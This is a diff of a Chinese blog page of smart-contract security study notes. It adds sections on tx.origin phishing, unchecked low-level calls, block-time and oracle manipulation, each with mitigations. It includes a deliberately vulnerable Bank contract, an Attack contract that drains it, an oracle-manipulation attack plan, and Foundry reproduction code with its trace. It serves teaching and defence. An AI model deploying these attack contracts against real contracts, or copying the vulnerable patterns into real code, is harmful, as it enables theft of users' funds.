@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/web3/eth2.jpg">
 <meta property="article:published_time" content="2025-08-21T02:29:30.000Z">
-<meta property="article:modified_time" content="2025-08-22T07:13:01.422Z">
+<meta property="article:modified_time" content="2025-08-22T11:17:26.178Z">
 <meta property="article:author" content="Wangxiaowang">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/img/web3/eth2.jpg">
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          11k 字
+          14k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          91 分钟
+          115 分钟
         
       </span>
     
@@ -660,6 +660,83 @@
 <p>如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，<code>msg.sender</code>就是B合约，而<code>tx.origin</code>就是用户A。如果你不了解<code>call</code>的机制，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md">WTF Solidity极简教程第22讲：Call</a>。</p>
 <p><img src="/img/web3/S12_1.jpg" srcset="/img/loading.gif" lazyload alt="S12-1"></p>
 <p>因此如果一个银行合约使用了<code>tx.origin</code>做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使<code>msg.sender</code>是攻击合约地址，但<code>tx.origin</code>是银行合约拥有者地址，那么转账就有可能成功。</p>
+<h2 id="漏洞合约例子-5"><a href="#漏洞合约例子-5" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="银行合约-1"><a href="#银行合约-1" class="headerlink" title="银行合约"></a>银行合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    address public owner;//记录合约的拥有者<br><br>    //在创建合约时给 owner 变量赋值<br>    constructor() payable &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function transfer(address payable _to, uint _amount) public &#123;<br>        //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！<br>        require(tx.origin == owner, &quot;Not owner&quot;);<br>        //转账ETH<br>        (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>        require(sent, &quot;Failed to send Ether&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="攻击合约-1"><a href="#攻击合约-1" class="headerlink" title="攻击合约"></a>攻击合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    // 受益者地址<br>    address payable public hacker;<br>    // Bank合约地址<br>    Bank bank;<br><br>    constructor(Bank _bank) &#123;<br>        //强制将address类型的_bank转换为Bank类型<br>        bank = Bank(_bank);<br>        //将受益者地址赋值为部署者地址<br>        hacker = payable(msg.sender);<br>    &#125;<br><br>    function attack() public &#123;<br>        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中<br>        bank.transfer(hacker, address(bank).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="攻击复线"><a href="#攻击复线" class="headerlink" title="攻击复线"></a>攻击复线</h3><p><strong>1.</strong> 先将<code>value</code>设置为10ETH，再部署 <code>Bank</code> 合约，拥有者地址 <code>owner</code> 被初始化为部署合约地址。</p>
+<p><strong>2.</strong> 切换到另一个钱包作为黑客钱包，填入要攻击的银行合约地址，再部署 <code>Attack</code> 合约，黑客地址 <code>hacker</code> 被初始化为部署合约地址</p>
+<p><strong>3.</strong> 切换回<code>owner</code>地址，此时我们被诱导调用了<code>Attack</code>合约的<code>attack()</code>函数，可以看到<code>Bank</code>合约余额被掏空了，同时黑客地址多了10ETH</p>
+<h2 id="预防办法-4"><a href="#预防办法-4" class="headerlink" title="预防办法"></a>预防办法</h2><h3 id="1-使用msg-sender代替tx-origin"><a href="#1-使用msg-sender代替tx-origin" class="headerlink" title="1.使用msg.sender代替tx.origin"></a>1.使用<code>msg.sender</code>代替<code>tx.origin</code></h3><p><code>msg.sender</code>能够获取直接调用当前合约的调用发送者地址，通过对<code>msg.sender</code>的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address payable _to, uint256 _amount) public &#123;<br>  require(msg.sender == owner, &quot;Not owner&quot;);<br><br>  (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>  require(sent, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-检验tx-origin-msg-sender"><a href="#2-检验tx-origin-msg-sender" class="headerlink" title="2.检验tx.origin == msg.sender"></a>2.检验<code>tx.origin == msg.sender</code></h3><p>如果一定要使用<code>tx.origin</code>，那么可以再检验<code>tx.origin</code>是否等于<code>msg.sender</code>，这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address payable _to, uint _amount) public &#123;<br>    require(tx.origin == owner, &quot;Not owner&quot;);<br>    require(tx.origin == msg.sender, &quot;can&#x27;t call by external contract&quot;);<br>    (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>    require(sent, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="S13-未检查的低级调用"><a href="#S13-未检查的低级调用" class="headerlink" title="S13. 未检查的低级调用"></a>S13. 未检查的低级调用</h1><p>失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。</p>
+<p>以太坊的低级调用包括 <code>call()</code>，<code>delegatecall()</code>，<code>staticcall()</code>，和<code>send()</code>。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 <code>false</code> ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。对于低级调用更多的内容，请阅读 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity">WTF Solidity 极简教程第20-23讲</a>。</p>
+<p>最容易出错的是<code>send()</code>：一些合约使用 <code>send()</code> 发送 <code>ETH</code>，但是 <code>send()</code> 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 <code>send()</code> 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。2016年，有一款叫 <code>King of Ether</code> 的链游，因为这个漏洞导致退款无法正常发送（<a target="_blank" rel="noopener" href="https://www.kingoftheether.com/postmortem.html">验尸报告</a>）。</p>
+<p><img src="/img/web3/S13-1.png" srcset="/img/loading.gif" lazyload alt="S13-1"></p>
+<h2 id="漏洞例子-2"><a href="#漏洞例子-2" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><h3 id="银行合约-2"><a href="#银行合约-2" class="headerlink" title="银行合约"></a>银行合约</h3><p>这个合约是在<code>S01 重入攻击</code>教程中的银行合约基础上修改而成。它包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；并且包含<code>3</code>个函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedBank &#123;<br>    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping<br><br>    // 存入ether，并更新余额<br>    function deposit() external payable &#123;<br>        balanceOf[msg.sender] += msg.value;<br>    &#125;<br><br>    // 提取msg.sender的全部ether<br>    function withdraw() external &#123;<br>        // 获取余额<br>        uint256 balance = balanceOf[msg.sender];<br>        require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>        balanceOf[msg.sender] = 0;<br>        // Unchecked low-level call<br>        bool success = payable(msg.sender).send(balance);<br>    &#125;<br><br>    // 获取银行合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="攻击合约-2"><a href="#攻击合约-2" class="headerlink" title="攻击合约"></a>攻击合约</h2><p>我们构造了一个攻击合约，它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 <code>receive()</code> 中的 <code>revert()</code> 将回滚交易，因此它无法接收 <code>ETH</code>；但是提款函数 <code>withdraw()</code> 却能正常调用，清空余额</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedAttack &#123;<br>    UncheckedBank public bank; // Bank合约地址<br>    // 初始化Bank合约地址<br>    constructor(UncheckedBank _bank) &#123;<br>        bank = _bank;<br>    &#125;<br>    // 回调函数，转账ETH时会失败<br>    receive() external payable &#123;<br>        revert();<br>    &#125;<br>    // 存款函数，调用时 msg.value 设为存款数量<br>    function deposit() external payable &#123;<br>        bank.deposit&#123;value: msg.value&#125;();<br>    &#125;<br>    // 取款函数，虽然调用成功，但实际上取款失败<br>    function withdraw() external payable &#123;<br>        bank.withdraw();<br>    &#125;<br>    // 获取本合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedAttackTest is Test &#123;<br>    UncheckedBank public bank;<br>    UncheckedAttack public attack;<br>    function setUp() public &#123;<br>        bank = new UncheckedBank(); // 部署Bank合约<br>        vm.deal(address(this), 1000 * 1e18);<br>//        bank.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        attack = new UncheckedAttack(bank); // 部署攻击合约<br>    &#125;<br>    function test_attack() public &#123;<br>        // 攻击执行<br>        attack.deposit&#123;value: 1 * 1e18&#125;();<br>        uint256 balancesAfter = attack.getBalance(); // 但是我仍然没有收到这个余额，提款失败了<br>        console.log(&quot;balances After  is &quot;, balancesAfter);<br>        bank.balanceOf(address(attack)); // 有1 ETH<br><br>        attack.withdraw();//提款，提款失败了，但是我的余额也没有了<br><br>        bank.balanceOf(address(attack)); //没了<br>        uint256 balancesBefore = attack.getBalance(); // 但是我仍然没有收到这个余额，提款失败了<br>        console.log(&quot;balances Before   is &quot;, balancesBefore);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>执行结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traces:<br>  [66787] UncheckedAttackTest::test_attack()<br>    ├─ [34398] UncheckedAttack::deposit&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22559] UncheckedBank::deposit&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [312] UncheckedAttack::getBalance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;balances After  is &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [823] UncheckedBank::balanceOf(UncheckedAttack: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]<br>    │   └─ ← [Return] 1000000000000000000 [1e18]<br>    ├─ [8083] UncheckedAttack::withdraw()<br>    │   ├─ [7493] UncheckedBank::withdraw()<br>    │   │   ├─ [45] UncheckedAttack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   └─ ← [Revert] EvmError: Revert<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [823] UncheckedBank::balanceOf(UncheckedAttack: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall] //余额没了<br>    │   └─ ← [Return] 0<br>    ├─ [312] UncheckedAttack::getBalance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;balances Before   is &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="预防办法-5"><a href="#预防办法-5" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用以下几种方法来预防未检查低级调用的漏洞：</p>
+<ol>
+<li><p>检查低级调用的返回值，在上面的银行合约中，我们可以改正 <code>withdraw()</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool success = payable(msg.sender).send(balance);<br>require(success, &quot;Failed Sending ETH!&quot;)<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>合约转账<code>ETH</code>时，使用 <code>call()</code>，并做好重入保护。</p>
+</li>
+<li><p>使用<code>OpenZeppelin</code>的<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol">Address库</a>，它将检查返回值的低级调用封装好了。</p>
+</li>
+</ol>
+<h1 id="S14-操纵区块时间"><a href="#S14-操纵区块时间" class="headerlink" title="S14. 操纵区块时间"></a>S14. 操纵区块时间</h1><p>以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。</p>
+<h2 id="区块时间"><a href="#区块时间" class="headerlink" title="区块时间"></a>区块时间</h2><p>区块时间（block timestamp）是包含在以太坊区块头中的一个 <code>uint64</code> 值，代表此区块创建的 UTC 时间戳（单位：秒），在合并（The Merge）之前，以太坊会根据算力调整区块难度，因此出块时间不定，平均 14.5s 出一个区块，矿工可以操纵区块时间；合并之后，改为固定 12s 一个区块，验证节点不能操纵区块时间。</p>
+<p>在 Solidity 中，开发者可以通过全局变量 <code>block.timestamp</code> 获取当前区块的时间戳，类型为 <code>uint256</code>。</p>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了智能合约的操纵区块时间攻击，并使用 Foundry 复现了它。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中遇到。</p>
+<h1 id="S15-操纵预言机"><a href="#S15-操纵预言机" class="headerlink" title="S15. 操纵预言机"></a>S15. 操纵预言机</h1><h2 id="价格预言机"><a href="#价格预言机" class="headerlink" title="价格预言机"></a>价格预言机</h2><p>出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。</p>
+<p>预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。</p>
+<p>其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例：</p>
+<ul>
+<li>去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。</li>
+<li>合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。</li>
+<li>MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。</li>
+</ul>
+<p><strong>在很多场景下，都需要知道代币的当前价格，比如说你给我1颗BTC我给你当前BTC同等价值的USDT，这个价格怎么来呢？只能从价格预言机里来，如果找到了这个合约所依赖的价格预言机来源（比如说某个池Uniswapv2的池子的当前储备量：USDT&lt;&#x3D;&#x3D;&gt;wBTC），且操控了预言机，是不是就可以以更少的BTC换到更多的USDT了？</strong></p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>我们针对有漏洞的价格预言机 <code>getPrice()</code> 函数进行攻击，步骤：</p>
+<ol>
+<li>准备一些 <code>BUSD</code>，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 <code>deal</code> cheatcode 在本地网络上给自己铸造了 <code>1_000_000 BUSD</code></li>
+<li>在 UniswapV2 的 <code>WETH-BUSD</code> 池中使用<code>BUSD</code>大量买入 <code>WETH</code>。具体实现见攻击代码的 <code>swapBUSDtoWETH()</code> 函数。</li>
+<li>在此情况下，<code>WETH-BUSD</code>池中代币对比例失去了平衡，<code>WETH</code> 瞬时价格暴涨，这时我们调用 <code>swap()</code> 函数将 <code>ETH</code> 转换为 <code>oUSD</code>。</li>
+<li><strong>可选:</strong> 在 UniswapV2 的 <code>WETH-BUSD</code> 池中卖出第2步买入的 <code>WETH</code>，收回本金。</li>
+</ol>
+<h2 id="预防方法-2"><a href="#预防方法-2" class="headerlink" title="预防方法"></a>预防方法</h2><p>知名区块链安全专家 <code>samczsun</code> 在一篇<a target="_blank" rel="noopener" href="https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle">博客</a>中总结了预言机操纵的预防方法，这里总结一下：</p>
+<ol>
+<li>不要使用流动性差的池子做价格预言机。</li>
+<li>不要使用现货&#x2F;瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。</li>
+<li>使用去中心化的预言机。</li>
+<li>使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。</li>
+<li>在使用Oracle预言机的询价方法如<code>latestRoundData()</code>，需要对返回结果进行校验，防止使用过时失效数据。</li>
+<li>仔细阅读第三方价格预言机的使用文档及参数设置。</li>
+</ol>
+<h1 id="S16-NFT重入攻击"><a href="#S16-NFT重入攻击" class="headerlink" title="S16. NFT重入攻击"></a>S16. NFT重入攻击</h1><p>——-空一下</p>
+<h1 id="S17-“跨服”重入攻击"><a href="#S17-“跨服”重入攻击" class="headerlink" title="S17. “跨服”重入攻击"></a>S17. “跨服”重入攻击</h1><p>在智能合约安全领域，重入攻击永远是一个备受关注的话题。在<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md">重入攻击</a>这一讲中，<code>0xAA</code>生动展示了教科书级经典的重入攻击思路；而在生产环境中，常常有一些更加安排巧妙，复杂的实例一直在以各种新瓶装旧酒的面目不断地出现，并且成功地对很多项目造成了破坏。这些实例展示了攻击者如何利用智能合约中的漏洞来搭配组合出精心策划的攻击。</p>
+<p>我们将介绍一些生产环境中真实发生的具有“跨服”属性的重入攻击案例。所谓“跨服”，是对这一类型的攻击目标的生动概括，因为它们共同的手段是从某一个函数开始入手，但是攻击对象却是其他函数&#x2F;合约&#x2F;项目等等。在本讲中我会带领大家简化并提炼其操作，探讨攻击者的思路、利用的漏洞以及对应的防御措施。通过了解这些实例，我们可以更好地理解重入攻击的本质，并且提高我们编写安全智能合约的技能和意识。</p>
+<p>注：以下所展示的代码示例均为简化过的<code>pseudo-code</code>, 主要以阐释攻击思路为目的。内容源自众多<code>Web3 Security Researchers</code>所分享的审计案例,感谢他们的贡献！</p>
 
                 
               </div>
